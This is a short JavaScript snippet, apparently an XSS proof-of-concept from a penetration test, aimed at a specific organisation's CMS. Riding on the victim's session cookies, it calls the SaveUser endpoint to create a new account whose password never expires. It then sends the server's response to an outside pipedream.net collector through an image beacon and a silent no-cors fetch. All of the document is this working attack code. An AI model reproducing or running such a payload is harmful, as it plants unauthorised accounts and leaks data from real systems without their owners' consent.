fetch('https://cms.sipradi.com.np/Setup/Security/SaveUser', {
  method: 'POST',
  credentials: 'include', // send cookies for authentication
  headers: {
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryVAPT'
  },
  body: `------WebKitFormBoundaryVAPT
Content-Disposition: form-data; name="jsonData"

{"UserId":0,"GroupId":1,"FirstName":"XSS","LastName":"User","Designation":"Injected","UserName":"xss_user","Password":"XssPass@123","RePassword":"XssPass@123","Address":"Injected via XSS","MobileNO":"9800000000","BranchId":1,"EMailID":"xssuser@example.com","Active":true,"UserNeverExpire":true,"UserCannotChangePassword":false,"ChangePasswordFirstTime":false,"LogonHours":1,"UserWiseSecurity":false,"UserWiseAutoPost":false,"UserType":1,"Mode":"Save"}
------WebKitFormBoundaryVAPT--`
})
.then(res => res.text())
.then(responseText => {
  console.log("User creation response:", responseText);

  // Exfiltrate response via image beacon (GET)
  var img = new Image();
  img.src = 'https://38e4abf20e4f806dfe0a3252fb581142.m.pipedream.net/log?data=' + encodeURIComponent(responseText);

  // Exfiltrate response via fetch POST with no-cors (silent)
  fetch('https://38e4abf20e4f806dfe0a3252fb581142.m.pipedream.net/log', {
    method: 'POST',
    mode: 'no-cors',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ message: responseText })
  });
})
.catch(console.error);
